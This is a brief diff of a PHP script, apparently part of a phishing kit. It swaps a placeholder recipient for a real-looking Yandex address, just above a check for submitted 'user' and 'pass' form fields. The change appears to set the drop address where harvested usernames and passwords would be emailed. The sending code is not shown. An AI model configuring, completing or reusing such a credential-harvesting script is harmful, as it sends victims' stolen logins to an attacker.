@@ -1,7 +1,7 @@
 <?php
 
 
-$recipient = 'youremail@gmail.com'; // Put your email address here
+$recipient = 'westsideway@yandex.com'; // Put your email address here
 
 if(isset($_POST['user']) && isset($_POST['pass'])){
 
